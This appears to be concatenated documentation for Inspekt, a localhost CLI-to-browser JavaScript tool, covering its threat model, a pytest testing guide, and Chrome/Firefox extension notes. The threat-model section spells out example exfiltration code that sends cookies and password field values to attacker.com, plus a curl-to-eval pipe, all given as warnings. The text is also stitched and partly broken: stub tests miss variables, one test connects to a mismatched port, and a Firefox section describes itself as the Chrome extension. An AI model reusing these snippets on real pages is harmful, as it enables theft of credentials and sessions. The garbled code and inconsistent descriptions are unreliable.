docs.title: Security
docs.text: Security considerations, threat model, and best practices for Inspekt.

docs.title: Overview
docs.text: Inspekt is a local development tool with a pragmatic security model designed for trusted development environments.

docs.title: Core Principles
docs.text:
1. Localhost-only - Server binds to 127.0.0.1 exclusively
  2. No remote access - Not designed or hardened for internet exposure
  3. User trust model - Users must trust JavaScript code they execute
  4. Browser security - Relies on browser sandboxing and same-origin policy

docs.title: In Scope
docs.text: These threats are relevant and mitigated:

docs.title: 1. Malicious JavaScript Execution
docs.text:
Threat: User executes untrusted JavaScript that steals data or performs unwanted actions.

Impact: High - Can steal cookies, make requests, modify DOM

Mitigation:

  • ✅ Explicit user action required (no automatic execution)
  • ✅ Scripts are visible before execution
  • ✅ User can review code in terminal or files
  • ✅ Browser sandbox provides isolation

Example attack:

# Attacker tricks user into running malicious script
inspekt eval "fetch('https://attacker.com/steal?cookies=' + document.cookie)"

Defense: User education - only run trusted scripts

docs.title: 2. Local Privilege Escalation
docs.text:
Threat: Malicious script escalates privileges on local machine.

Impact: Medium - Limited by browser sandbox

Mitigation:

  • ✅ Browser sandbox isolates script execution
  • ✅ Scripts cannot access filesystem directly
  • ✅ Python server runs with user privileges (not elevated)
  • ✅ No shell command execution from browser

docs.title: 3. Configuration Tampering
docs.text:
Threat: Malicious process modifies config.json to enable harmful behavior.

Impact: Low - Configuration has minimal attack surface

Mitigation:

  • ✅ No security-critical settings
  • ✅ All communication is localhost-only
  • ✅ File permissions follow OS defaults
  • ✅ No automatic config reload

docs.title: 4. Userscript Injection Attacks
docs.text:
Threat: Malicious website exploits userscript to execute code.

Impact: Medium - Limited to browser context

Mitigation:

  • ✅ Userscript runs on all sites (@match *://*/*)
  • ✅ Only executes code from authenticated WebSocket
  • ✅ Only active tab processes commands
  • ✅ Same-origin policy still applies

docs.title: Out of Scope
docs.text: These threats are explicitly out of scope:

docs.title: 1. Remote Attacks
docs.text:
Not applicable: Server never exposed to network by design.

  • ✅ Localhost binding (127.0.0.1) prevents remote access
  • ✅ No configuration option to bind to public IPs
  • ✅ Firewall provides additional protection

docs.title: 2. Network-Based Attacks
docs.text:
Not applicable: All communication is localhost-only.

  • ✅ Traffic never leaves the machine
  • ✅ No network interception possible
  • ✅ OS kernel handles localhost communication

docs.title: 3. Man-in-the-Middle Attacks
docs.text:
Not applicable: Localhost communication cannot be intercepted.

  • ✅ Loopback interface is kernel-managed
  • ✅ No external network involvement
  • ✅ Local user with root can already compromise system

docs.title: 4. Browser Vulnerabilities
docs.text:
Separate concern: Browser security is vendor responsibility.

  • ✅ Inspekt relies on browser sandboxing
  • ✅ No additional browser security bypass
  • ✅ Keep browser updated (user responsibility)

docs.title: Localhost Binding
docs.text:
Server always binds to 127.0.0.1:

# zen/bridge_ws.py
HOST = "127.0.0.1"  # Never binds to 0.0.0.0 or public IPs
PORT = 8765

Guarantees:

  • ✅ No remote connections possible
  • ✅ Only local processes can connect
  • ✅ Protected by OS networking stack

Never Bind to 0.0.0.0

Modifying HOST to 0.0.0.0 or any public IP would expose your browser to remote code execution. This is extremely dangerous and defeats all security measures.

docs.title: No Authentication Required
docs.text:
Current status: No authentication between CLI and server.

Rationale:

  • ✅ Localhost-only reduces attack surface
  • ✅ If machine is compromised, attacker has access anyway
  • ✅ Simplifies development workflow
  • ✅ User controls when server runs

Future enhancement: Optional token-based authentication for additional security.

docs.title: No Encryption
docs.text:
WebSocket traffic is unencrypted (ws:// instead of wss://).

Why acceptable:

  • ✅ Traffic never leaves localhost
  • ✅ OS kernel handles loopback communication
  • ✅ Faster performance without TLS
  • ✅ No certificate management needed

Warning

If you modify HOST to bind to public IPs, traffic would be unencrypted over the network. This is unacceptable and dangerous.

docs.title: All Execution is Intentional
docs.text:
# User must explicitly run commands
inspekt eval "document.title"        # Explicit
inspekt exec script.js               # Explicit
inspekt extract-links                # Explicit

# No automatic execution on server start
inspekt server start  # Only starts server, no code execution

Properties:

  • ✅ User must type command explicitly
  • ✅ No background execution
  • ✅ Clear audit trail in terminal
  • ✅ Code visible before execution

docs.title: User Must Install Userscript
docs.text:
Installation steps:

  1. User downloads userscript_ws.js
  2. User opens Tampermonkey/Violentmonkey
  3. User creates new script
  4. User pastes and saves
  5. User can review code anytime
  6. User can disable/uninstall anytime

Properties:

  • ✅ Explicit installation required
  • ✅ Code is visible and reviewable
  • ✅ Can be disabled instantly
  • ✅ User has full control

docs.title: Scripts from Trusted Filesystem
docs.text:
Built-in scripts loaded from package installation:

# zen/services/script_loader.py
script_path = Path(__file__).parent.parent / "scripts" / script_name

Security considerations:

  • ✅ Scripts bundled with package
  • ✅ Installed from trusted source (PyPI, GitHub)
  • ✅ Cannot be modified without user action
  • ✅ Standard file permissions apply

docs.title: No Secrets Required
docs.text:
Configuration file contains no sensitive data:

{
  "ai-language": "nl",
  "control": {
    "auto-refocus": "always",
    "speak-all": true,
    "verbose": true
  }
}

Properties:

  • ✅ No API keys
  • ✅ No passwords
  • ✅ No tokens
  • ✅ Safe to commit (if desired)

docs.title: No Secrets in Logs
docs.text:
Server logs connection events only:

HTTP server running on http://127.0.0.1:8765
WebSocket connection opened (active: 1)
Request abc-123: pending
Request abc-123: completed (success)

Properties:

  • ✅ No page content logged
  • ✅ No sensitive data logged
  • ✅ Request IDs are UUIDs (not predictable)
  • ✅ Error messages sanitized

docs.title: 1. Only Run Trusted JavaScript
docs.text:
# ✅ Good: Review script first
cat my_script.js
inspekt exec my_script.js

# ✅ Good: Understand inline code
inspekt eval "document.querySelectorAll('a').length"

# ❌ Bad: Run unknown script
curl https://untrusted.com/script.js | inspekt eval  # DON'T!

docs.title: 2. Review Scripts Before Execution
docs.text:
Before running any script:

  1. Read the JavaScript code completely
  2. Understand what it does
  3. Check for network requests
  4. Look for data exfiltration
  5. Test on non-sensitive pages first

docs.title: 3. Don't Modify Server Binding
docs.text:
Never change HOST in bridge_ws.py:

# ❌ DANGEROUS - Do NOT do this!
HOST = "0.0.0.0"           # Exposes to network
HOST = "192.168.1.100"     # Exposes to LAN

This would allow remote code execution in your browser.

docs.title: 4. Keep Userscript Updated
docs.text:
# Check version
inspekt eval "window.__ZEN_BRIDGE_VERSION__"
# Current version: 3.4

Update when new versions are released for security fixes.

docs.title: 5. Stop Server When Not in Use
docs.text:
# Stop when done
inspekt server stop

# Check status
inspekt server status

If server isn't running, attack surface is eliminated.

docs.title: 6. Use Firewall (Defense in Depth)
docs.text:
Even with localhost binding, add firewall rules:

# macOS
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /usr/local/bin/python3
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --block /usr/local/bin/python3

# Linux (iptables)
sudo iptables -A INPUT -p tcp --dport 8765 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 8765 -j DROP

docs.title: 1. Validate All Inputs
docs.text:
# ✅ Good: Validate with Pydantic
from zen.domain.models import RunRequest

data = await request.json()
validated = RunRequest(**data)  # Raises ValidationError if invalid

# ❌ Bad: No validation
data = await request.json()
code = data["code"]  # Could be missing or wrong type

docs.title: 2. Sanitize Error Messages
docs.text:
# ✅ Good: Generic error
return web.json_response(
    {"ok": False, "error": "Request failed"},
    status=500
)

# ❌ Bad: Leaks paths
return web.json_response(
    {"ok": False, "error": f"File not found: {user_path}"},
    status=500
)

docs.title: 3. No Secrets in Code or Logs
docs.text:
# ✅ Good: Don't log sensitive data
logger.info(f"Request {request_id} completed")

# ❌ Bad: Logs cookies
logger.info(f"Cookies: {cookies}")

docs.title: 4. Follow Least Privilege
docs.text:
• Run server with user privileges (not root/admin)
  • Don't request unnecessary browser permissions
  • Limit userscript to minimum required
  • Don't expose internal state unnecessarily

docs.title: 5. Document Security Assumptions
docs.text:
When adding features:

  • What security assumptions are made?
  • What trust is required from user?
  • What could go wrong if misused?
  • What threat model applies?

docs.title: 1. Arbitrary JavaScript Execution
docs.text:
By design: Inspekt executes arbitrary JavaScript.

Implications:

  • Can steal session cookies
  • Can submit forms, make purchases
  • Can read sensitive page content
  • Can modify DOM, inject content
  • Can make network requests

Example attack:

// Steal all cookies
document.cookie.split(';').forEach(cookie => {
    fetch('https://attacker.com/steal?c=' + encodeURIComponent(cookie));
});

// Steal form data
document.querySelectorAll('input[type=password]').forEach(input => {
    fetch('https://attacker.com/steal?pwd=' + input.value);
});

Defense: Only run JavaScript you trust and understand.

docs.title: 2. No Authentication
docs.text:
Current status: Any local process can use bridge.

Implications:

  • Local malware can execute JavaScript
  • Other users on same machine can use bridge
  • No audit of who executed what

Acceptable because:

  • Localhost-only reduces exposure
  • Compromised machine has bigger problems
  • User controls when server runs

Future enhancement: Optional token authentication.

docs.title: 3. No Rate Limiting
docs.text:
Current status: No limits on request rate.

Implications:

  • Buggy script can spam requests
  • Could cause high CPU in browser
  • Could cause memory buildup

Acceptable because:

  • User controls both CLI and server
  • Easy to stop server if needed
  • Cleanup task removes old requests

Future enhancement: Optional rate limiting.

docs.title: 4. No Audit Logging
docs.text:
Current status: No persistent log of commands.

Implications:

  • No history of what was executed
  • Cannot review past actions
  • Cannot detect suspicious activity

Future enhancement: Optional audit log.

docs.title: How to Report
docs.text:
If you discover a security vulnerability:

  1. Do NOT open public GitHub issue
  2. Email maintainer directly via GitHub profile
  3. Include [SECURITY] in subject
  4. Provide:
  5. Description of vulnerability
  6. Steps to reproduce
  7. Potential impact
  8. Suggested fix (if any)

docs.title: Response Timeline
docs.text:
• Initial response: Within 48 hours
  • Assessment: Within 1 week
  • Fix timeline:
  • Critical: 1-7 days
  • High: 1-2 weeks
  • Medium: 2-4 weeks
  • Low: Best effort

docs.title: Responsible Disclosure
docs.text:
We follow responsible disclosure:

  1. Report received and acknowledged
  2. Vulnerability validated
  3. Fix developed privately
  4. Coordinated disclosure timeline
  5. Public release with fix
  6. Reporter credited (if desired)

docs.title: 1. Optional Token Authentication
docs.text:
Proposal: Add optional authentication token.

# Server generates token on start
inspekt server start
# Server token: abc123xyz

# CLI uses token
inspekt eval "code" --token abc123xyz

# Or environment variable
export ZEN_BRIDGE_TOKEN=abc123xyz
inspekt eval "code"

Benefits:

  • Prevents other local processes from using bridge
  • Optional (disabled by default)
  • Additional security layer

docs.title: 2. WebSocket Origin Validation
docs.text:
Proposal: Validate Origin header.

async def websocket_handler(request):
    origin = request.headers.get('Origin', '')

    # Only accept browser extensions
    if not (origin.startswith('moz-extension://') or
            origin.startswith('chrome-extension://')):
        return web.Response(status=403)

Benefits:

  • Prevents malicious websites from connecting
  • Additional protection against local web attacks

docs.title: 3. Rate Limiting
docs.text:
Proposal: Add rate limiting to endpoints.

# 100 requests per minute
rate_limiter = RateLimiter(requests=100, period=60)

async def handle_http_run(request):
    if not rate_limiter.allow():
        return web.json_response(
            {"ok": False, "error": "Rate limit exceeded"},
            status=429
        )

Benefits:

  • Prevents accidental DoS
  • Limits impact of malicious processes
  • Protects browser from excessive execution

docs.title: 4. Audit Logging
docs.text:
Proposal: Optional command history log.

# Enable
inspekt config set audit.enabled true

# Log format
[2025-10-27 10:30:45] EVAL "document.title" -> "Example"
[2025-10-27 10:31:12] EXEC script.js -> OK

Benefits:

  • Review command history
  • Detect suspicious activity
  • Debugging aid

docs.title: 5. Content Security Policy Awareness
docs.text:
Proposal: Detect and warn about CSP.

inspekt eval "fetch('https://api.example.com')"
# Warning: Page has CSP that may block fetch
# CSP: default-src 'self'

Benefits:

  • Better UX (explain failures)
  • Security awareness
  • Debugging aid

docs.title: For New Features
docs.text:
Before merging:

  • Network binding: Binds to 127.0.0.1 only?
  • Code execution: Requires explicit user action?
  • Logging: No sensitive data logged?
  • Input validation: All inputs validated?
  • Error handling: Error messages sanitized?
  • Dependencies: Dependencies audited?
  • Configuration: No security-critical settings?
  • Documentation: Security assumptions documented?

docs.title: Summary
docs.text:
Inspekt security model:

Core Principles:

  1. Localhost-only (never network-exposed)
  2. User trusts scripts they execute
  3. No authentication (localhost trust model)
  4. Browser provides security boundary

Acceptable Risks:

  • Local processes can connect
  • Arbitrary JavaScript execution (by design)
  • No encryption for localhost traffic

Unacceptable Risks:

  • Remote code execution (prevented by localhost binding)
  • Automatic code execution (requires user action)
  • Secret leakage (no secrets in config/logs)

User Responsibility:

  • Only execute trusted JavaScript
  • Keep userscript updated
  • Review scripts before running
  • Don't modify server to bind to public IPs

This security model is appropriate for a development tool on a trusted local machine. For production or high-security environments, consider additional measures from the Future Enhancements section.

For the complete security policy, see SECURITY.md in the project repository root.

Stay secure and happy coding!

docs.title: Testing Guide
docs.text: Comprehensive guide to testing Inspekt. This covers unit tests, integration tests, E2E tests, and test coverage strategies.

docs.title: Overview
docs.text:
Inspekt uses pytest as the testing framework with support for:

  • Unit tests - Fast, isolated tests for individual functions
  • Integration tests - Multi-component tests (CLI + server)
  • E2E tests - Full browser integration tests
  • Async tests - Tests for async/await code
  • Coverage tracking - Code coverage reporting

docs.title: Test Structure
docs.text:
tests/
├── conftest.py              # Shared fixtures
├── test_smoke.py            # Basic smoke tests (24 tests)
│
├── unit/                    # Unit tests (fast, isolated)
│   ├── __init__.py
│   ├── test_models.py       # Pydantic models (28 tests)
│   ├── test_script_loader.py
│   ├── test_bridge_executor.py
│   ├── test_ai_integration.py
│   └── test_control_manager.py
│
├── integration/             # Integration tests (server + client)
│   ├── __init__.py
│   ├── test_bridge_loop.py
│   └── test_cli_integration.py
│
├── e2e/                     # End-to-end tests (browser)
│   ├── __init__.py
│   └── test_browser_integration.py
│
└── fixtures/                # Test data
    ├── test_page.html
    └── mock_scripts.js

docs.title: All Tests
docs.text:
# Run all tests
pytest

# With verbose output
pytest -v

# With very verbose output
pytest -vv

docs.title: Specific Test Suites

docs.title: Unit Tests
docs.text: Unit tests should be fast, isolated, and test single functions.

docs.title: Basic Example
docs.text:
# tests/unit/test_my_service.py
import pytest
from zen.services.my_service import MyService


class TestMyService:
    """Test MyService functionality."""

    def test_initialization(self):
        """Test service can be initialized."""
        service = MyService()
        assert service is not None

    def test_process_data(self):
        """Test data processing."""
        service = MyService()
        result = service.process("input")
        assert result == "processed: input"

    def test_invalid_input_raises_error(self):
        """Test that invalid input raises ValueError."""
        service = MyService()
        with pytest.raises(ValueError) as exc_info:
            service.process("")

        assert "input is required" in str(exc_info.value)

docs.title: Pydantic Model Tests
docs.text:
# tests/unit/test_models.py
import pytest
from pydantic import ValidationError
from zen.domain.models import ExecuteRequest


class TestExecuteRequest:
    """Test ExecuteRequest model."""

    def test_valid_request(self):
        """Test creating valid request."""
        req = ExecuteRequest(
            request_id="test-123",
            code="document.title"
        )
        assert req.type == "execute"
        assert req.request_id == "test-123"
        assert req.code == "document.title"

    def test_missing_required_field(self):
        """Test that missing required field raises error."""
        with pytest.raises(ValidationError) as exc_info:
            ExecuteRequest(request_id="test-123")  # Missing code

        errors = exc_info.value.errors()
        assert any(e["loc"] == ("code",) for e in errors)

    def test_serialization(self):
        """Test model serialization."""
        req = ExecuteRequest(request_id="id", code="code")
        data = req.model_dump()

        assert data == {
            "type": "execute",
            "request_id": "id",
            "code": "code"
        }

    def test_deserialization(self):
        """Test model deserialization."""
        data = {
            "type": "execute",
            "request_id": "id",
            "code": "code"
        }
        req = ExecuteRequest(**data)

        assert req.request_id == "id"
        assert req.code == "code"

docs.title: Async Tests
docs.text:
For async functions, use @pytest.mark.asyncio:

import pytest
from pathlib import Path
from zen.adapters import filesystem


@pytest.mark.asyncio
async def test_read_text_async():
    """Test async file reading."""
    test_file = Path("test.txt")

    # Create test file
    test_file.write_text("test content")

    try:
        # Test async read
        content = await filesystem.read_text_async(test_file)
        assert content == "test content"
    finally:
        # Cleanup
        test_file.unlink()


@pytest.mark.asyncio
async def test_script_loader_async():
    """Test async script loading."""
    from zen.services.script_loader import ScriptLoader

    loader = ScriptLoader()
    script = await loader.load_script_async("control.js")

    assert len(script) > 0
    assert "use strict" in script

docs.title: Mocking
docs.text: Mocking replaces real implementations with test doubles.

docs.title: Mock Functions
docs.text:
import pytest
from unittest.mock import Mock, patch


def test_execute_with_mocked_client():
    """Test execution with mocked client."""
    from zen.services.bridge_executor import BridgeExecutor

    # Create mock client
    mock_client = Mock()
    mock_client.execute.return_value = {
        "ok": True,
        "result": "Test Result"
    }

    # Create executor with mock
    executor = BridgeExecutor()
    executor.client = mock_client

    # Test
    result = executor.execute("test code")

    assert result["ok"] is True
    assert result["result"] == "Test Result"
    mock_client.execute.assert_called_once_with("test code", timeout=10.0)

docs.title: Patch Functions
docs.text:
@patch("zen.adapters.filesystem.read_text_sync")
def test_script_loader_with_mock_fs(mock_read):
    """Test script loader with mocked filesystem."""
    from zen.services.script_loader import ScriptLoader

    # Configure mock
    mock_read.return_value = "console.log('test');"

    # Test
    loader = ScriptLoader()
    script = loader.load_script_sync("test.js")

# tests/integration/test_bridge_loop.py
import pytest
import aiohttp
from aiohttp import web
from zen.bridge_ws import create_app


@pytest.mark.integration
@pytest.mark.asyncio
async def test_execute_request_response():
    """Test full request/response cycle."""
    # Start server
    app = create_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 8765)
    await site.start()

    try:
        async with aiohttp.ClientSession() as session:
            # Mock browser WebSocket
            async with session.ws_connect("ws://127.0.0.1:8766/ws") as ws:
                # CLI sends request
                async with session.post(
                    "http://127.0.0.1:8765/run",
                    json={"code": "document.title"}
                ) as resp:
                    data = await resp.json()
                    request_id = data["request_id"]

                # Browser receives message
                msg = await ws.receive_json()
                assert msg["type"] == "execute"
                assert msg["request_id"] == request_id

                # Browser sends result
                await ws.send_json({
                    "type": "result",
                    "request_id": request_id,
                    "ok": True,
                    "result": "Test Page"
                })

                # CLI polls for result
                async with session.get(
                    f"http://127.0.0.1:8765/result?request_id={request_id}"
                ) as resp:
                    result = await resp.json()
                    assert result["ok"] is True
                    assert result["result"] == "Test Page"
    finally:
        await runner.cleanup()

def test_load_script():

    assert script is not None


def test_cache_script():

    loader.load_script_sync("test.js")

# ❌ Bad - Tests depend on each other

def test_load_script():

    loader.load_script_sync("test.js")

    # Depends on test_load_script running first

docs.title: How CSP Bypass Works
docs.text:
Extensions use the browser's native tabs.executeScript() API which has elevated privileges:

1. Content script receives execution request via WebSocket
2. Content script sends message to background script
3. Background script uses tabs.executeScript() to bypass CSP
4. Result is sent back to CLI via WebSocket

This is safe and intended - browser extensions are designed to have elevated privileges for legitimate purposes like browser automation, developer tools, and productivity enhancements.

docs.title: Inspekt - Security Features
docs.text: This document explains the security model implemented in Inspekt extensions (both Chrome and Firefox).

docs.title: Overview
docs.text: To address concerns about arbitrary code execution and improve Chrome Web Store acceptance chances, we've implemented a comprehensive opt-in permission system.

docs.title: How It Works
docs.text:
1. First Visit to Any Domain
  2. Content script loads but does NOT connect to WebSocket
  3. Permission check runs automatically

  4. If domain not allowed: Beautiful modal appears

  5. Permission Modal

  6. Clear heading: "Inspekt - Allow CLI control of this website?"
  7. Shows the domain name prominently
  8. Lists what Zen Bridge will be able to do
  9. Warning about only allowing trusted sites

  10. Two buttons: "Deny" or "Allow [domain]"

  11. After Permission Granted

  12. Domain saved to chrome.storage.sync (syncs across devices)
  13. WebSocket connection established
  14. Zen commands now work on this domain

  15. Permission persists across browser sessions

  16. Domain Management

  17. Extension popup shows all allowed domains
  18. Current domain status highlighted
  19. One-click to allow/remove domains
  20. Full transparency - see everywhere Zen has access

docs.title: User Experience Flow
docs.text:
User visits github.com
    ↓
Content script loads
    ↓
Checks: Is github.com allowed?
    ↓ NO
Shows permission modal
    ↓
User clicks "Allow github.com"
    ↓
Domain saved to storage
    ↓
WebSocket connects
    ↓
✓ Zen commands work

docs.title: Subsequent Visits
docs.text:
User visits github.com again
    ↓
Content script loads
    ↓
Checks: Is github.com allowed?
    ↓ YES (already in storage)
WebSocket connects immediately
    ↓
✓ Zen commands work (no modal)

docs.title: Storage
docs.text:
Location: chrome.storage.sync (or browser.storage.sync for Firefox)

Key: zen_allowed_domains

Value: Array of allowed domain strings

Example: 

{
  "zen_allowed_domains": [
    "github.com",
    "gmail.com",
    "localhost",
    "example.com"
  ]
}

Syncing: Permissions sync across all devices where user is signed in to Chrome/Firefox

docs.title: What We Store
docs.text:
• List of domains you've explicitly allowed
  • Stored locally using browser's storage API
  • Synced across your devices (via browser sync)

docs.title: What We DON'T Store
docs.text:
• No URLs or page content
  • No browsing history
  • No commands you run
  • No personal information
  • No analytics or tracking data

docs.title: Data Flow
docs.text:
Browser ←→ Extension ←→ localhost:8766 ←→ Your CLI

NO external servers
NO cloud services
NO data collection

docs.title: 1. Prevents Unauthorized Access
docs.text:
• Malicious websites can't automatically connect
  • You must explicitly allow each domain
  • No surprise connections

docs.title: 2. Least Privilege Principle
docs.text:
• Extension has permissions for <all_urls>
  • But ONLY activates on domains you allow
  • Unused permissions remain dormant

docs.title: 3. Transparent & Auditable
docs.text:
• See all allowed domains in popup
  • Revoke access anytime
  • Clear indication when Zen is active

docs.title: 4. User Control
docs.text:
• You decide which sites are safe
  • No blanket trust required
  • Fine-grained control per domain

docs.title: Files Involved
docs.text:
permissions.js (Content Script) - Handles domain permission checks - Shows opt-in modal - Manages storage operations - Loaded before main content script

content.js (Content Script) - Checks permission before connecting - Only establishes WebSocket if allowed - Respects user's permission decisions

popup.html/js/css (Extension Popup) - Displays current domain status - Lists all allowed domains - Allows adding/removing permissions - Visual management interface

manifest.json - Added storage permission - Loads permissions.js before content.js

docs.title: Key Functions
docs.text:
// Check if domain is allowed
ZenPermissions.isAllowed(domain)

// Show opt-in modal and wait for user decision
ZenPermissions.checkAndRequest()

// Add domain to allowed list
ZenPermissions.allowDomain(domain)

// Remove domain from allowed list
ZenPermissions.removeDomain(domain)

// Get all allowed domains
ZenPermissions.getAllowedDomains()

docs.title: Chrome Web Store Benefits
docs.text: This security model addresses Chrome Web Store's main concerns:

docs.title: 1. Arbitrary Code Execution
docs.text: Before: Extension could execute code on any website automatically Now: User must explicitly allow each domain first

docs.title: 2. Broad Permissions
docs.text: Before: <all_urls> looked dangerous without safeguards Now: Permission gated by user opt-in per domain

docs.title: 3. User Trust
docs.text: Before: Users couldn't control where extension worked Now: Full transparency and control

docs.title: 4. Security Disclosure
docs.text: Before: Hard to explain security model Now: Clear, visible permission system

docs.title: Permission Justification for Chrome Web Store
docs.text:
When submitting to Chrome Web Store, use this justification:

storage: 

Required to store user's domain permissions. Users must explicitly allow
each domain before the extension can control it. This list of allowed
domains is stored locally using chrome.storage.sync.

host_permissions (): 

Required to inject the content script that displays the permission modal
on all websites. The content script only establishes a connection AFTER
the user explicitly allows the domain. Users maintain full control over
which domains the extension can access.

docs.title: For End Users
docs.text:
Q: Do I need to allow every website? A: No! Only allow websites you actively want to control via Zen CLI. Most users only need 5-10 domains.

Q: What if I deny a domain by mistake? A: Open the extension popup, find the domain, and click "Allow This Domain". Or refresh the page to see the modal again.

Q: Can I revoke access later? A: Yes! Click the extension icon, find the domain in the list, and click "Remove".

Q: Do my permissions sync across computers? A: Yes, if you're signed in to Chrome/Firefox, your allowed domains sync automatically.

Q: Is this safe? A: Yes! You explicitly control which websites Zen can access. Plus, all communication stays between your browser and local CLI (localhost). No external servers involved.

docs.title: For Developers
docs.text:
Q: How do I test the permission modal? A: Clear storage (chrome.storage.sync.clear() in console) and refresh the page.

Q: Can I pre-allow domains programmatically? A: No, this would defeat the security model. Users must click "Allow" in the modal.

Q: Does this work offline? A: Yes, permissions are stored locally and don't require internet.

docs.title: How CSP Bypass Works
docs.text:
The extension uses Chrome's scripting.executeScript() API (Manifest V3) which has elevated privileges:

  1. Content script receives execution request from WebSocket
  2. Sends message to background service worker
  3. Background script uses scripting.executeScript() to bypass CSP
  4. Result is sent back via WebSocket

This is safe and intended - browser extensions can bypass CSP for legitimate purposes like developer tools, automation, and accessibility features.

docs.title: FAQ
docs.text:
Q: Why an extension instead of just a userscript? A: Userscripts are blocked by CSP on many important sites (GitHub, Gmail, banking). Extensions have elevated privileges and can bypass CSP.

Q: Is it safe to bypass CSP? A: Yes! Browser extensions are designed to have elevated privileges. CSP restrictions apply to web content, not to trusted browser extensions.

Q: Why Manifest V3? A: Chrome is phasing out Manifest V2 extensions. Manifest V3 is the future-proof standard for Chrome extensions.

Q: Will this work on Edge, Brave, or other Chromium browsers? A: Yes! This extension should work on any Chromium-based browser (Edge, Brave, Opera, Vivaldi, etc.). Just load it in developer mode.

Q: Can I use both userscript and extension? A: It's recommended to use only one at a time to avoid conflicts. The extension is the better choice for compatibility.

Q: When will it be on Chrome Web Store? A: We're preparing for submission! See CHROME_WEB_STORE.md for our publication roadmap and how you can help.

Control your browser from the terminal with AI-powered automation. Execute JavaScript, automate tasks, and interact with any website using natural language commands.

docs.title: Inspekt - Firefox Extension
docs.text: The Chrome extension for Inspekt that bypasses CSP restrictions and works on all websites including GitHub, Gmail, banking sites, and more.

docs.title: Features
docs.text: ✨ CSP Bypass - Works on all websites, no restrictions 🔒 Explicit Opt-In - You control which domains Zen can access 🚀 Automatic Connection - Connects to localhost:8766 automatically 🛠️ DevTools Integration - Use zenStore($0) in console 📊 Status Panel - Built-in settings panel with connection status and domain management 🔄 Auto-Reconnect - Maintains connection across page reloads ⚡ Manifest V2 - Uses latest Chrome extension architecture

docs.title: Method 1: Developer Mode (Temporary)
docs.text:
This is the quickest way to test the extension, but you'll need to reload it after browser restarts.

  1. Download the extension: 

    cd /path/to/inspekt
cd extensions/chrome

  2. Open Firefox Extensions page:

  3. Navigate to about:debugging#/runtime/this-firefox/

  4. Or click the puzzle icon (⚙️) → Manage Extensions

  5. Enable Developer Mode:

  6. Toggle the "Developer mode" switch in the top right corner

  7. Load the extension:

  8. Click "Load unpacked"

  9. Select the extensions/chrome directory (the folder containing manifest.json)

  10. Verify installation:

  11. Look for the ⚡ Inspekt extension in your list
  12. Click the puzzle icon and pin it to your toolbar for easy access
  13. Click the ⚡ icon to see the status panel

docs.title: Method 2: Packaged Extension (.crx or .zip)
docs.text:
For easier distribution and installation:

  1. Build the extension (see Building section below)

  2. Install the packaged extension:

  3. Open about:debugging#/runtime/this-firefox/
  4. Enable Developer mode
  5. Drag and drop the .zip file onto the page
  6. Or use "Load unpacked" and select the extracted folder

docs.title: Method 3: Chrome Web Store (Coming Soon)
docs.text: Once published to the Chrome Web Store, you'll be able to install with one click. See CHROME_WEB_STORE.md for our publication roadmap.

docs.title: 1. Start the Zen Server
docs.text: inspektserver start

docs.title: 2. Open Any Website and Allow It
docs.text:
When you first visit a website, you'll see a permission modal:

  1. Navigate to a website (e.g., github.com, gmail.com)
  2. Permission modal appears - "Allow CLI control of this website?"
  3. Click "Allow [domain]" to grant permission for that entire domain
  4. Connection established - Inspekt is now active on that site

The extension remembers your choice, so you only need to allow each domain once. You can manage allowed domains from the extension popup.

Security: You must explicitly allow each domain before Inspekt can control it. This prevents unauthorized access and gives you full control.

docs.title: 3. Run Zen Commands
docs.text:
# Get page info
inspektinfo

# Extract title
inspekteval "document.title"

# Natural language actions
inspektdo "click login button"

# AI-powered description
inspektdescribe

# And any other inspektcommand!

docs.title: 4. Manage Domains via Status Panel
docs.text: Click the ⚡ icon in your toolbar to: - View connection status (green = connected, yellow = connecting, red = disconnected) - See current domain status - Allowed or not allowed - Allow/remove current domain - One-click permission management - View all allowed domains - See everywhere Inspekt has access - Remove domains - Revoke access anytime - Quick start guide and common commands

docs.title: Advantages Over Userscript
docs.text:
Feature Userscript Extension Works on GitHub ❌ Blocked by CSP ✅ Yes Works on Gmail ❌ Blocked by CSP ✅ Yes Works on Banking Sites ❌ Blocked by CSP ✅ Yes Installation Easier (one click) Slightly more steps Auto-Update Via Tampermonkey Via Chrome Web Store (when published) Settings Panel ❌ No ✅ Yes Status Indicator ❌ No ✅ Yes

Recommendation: Use the extension for full compatibility on all websites!

docs.title: Explicit Opt-In Per Domain
docs.text:
You're in control. Inspekt requires explicit permission before it can access any website:

  1. First Visit - Permission modal appears
  2. You Decide - Allow or deny access for that domain
  3. Saved Choice - Extension remembers your decision
  4. Manage Anytime - View and revoke permissions from the popup

Why this matters: - Prevents unauthorized access to your sensitive sites - You choose exactly which domains Zen can control - Permissions persist across sessions but can be revoked anytime - Transparent - see all allowed domains in the settings panel

docs.title: Localhost-Only Communication
docs.text:
All communication stays between: - Your browser (extension) - Your local CLI (localhost:8766)

No external servers. No tracking. No data collection.

docs.title: How CSP Bypass Works
docs.text:
The extension uses Chrome's tabs.executeScript() API (Manifest V2) which has elevated privileges:

  1. Content script receives execution request from WebSocket
  2. Sends message to background background script
  3. Background script uses tabs.executeScript() to bypass CSP
  4. Result is sent back via WebSocket

This is safe and intended - browser extensions can bypass CSP for legitimate purposes like developer tools, automation, and accessibility features.

docs.title: DevTools Integration
docs.text:
The extension includes the same DevTools integration as the userscript:

// In browser console:
// 1. Inspect element (Right-click → Inspect)
// 2. Store it:
zenStore($0)

// 3. In terminal:
inspektinspected

docs.title: Create a ZIP Package
docs.text:
To create a distributable ZIP file:

cd extensions/chrome
zip -r zen-browser-bridge-chrome-4.0.0.zip . -x "*.git*" "*.DS_Store" "build.sh" "CHROME_WEB_STORE.md"

This creates a ZIP file that can be: - Shared with others for manual installation - Uploaded to Chrome Web Store for distribution

docs.text:
We'll add an automated build script similar to Firefox's:

./build.sh

This will: - Validate manifest.json - Create optimized ZIP package - Generate checksums - Prepare for Chrome Web Store submission

docs.title: Extension Not Connecting
docs.text:
Check the console (F12): - Look for [Inspekt Extension] Loaded message - Look for [Inspekt] Connected via WebSocket message

Verify server is running: 

inspektserver status

Restart server if needed: 

inspektserver restart

docs.title: Extension Not Loading
docs.text:
Reload extension: - Go to about:debugging#/runtime/this-firefox/ - Click the refresh icon (↻) on the Inspekt card

Check for errors: - Look in the extension's "Errors" section on about:debugging#/runtime/this-firefox/ - Check the background background script console - Check the browser console (F12) on any page

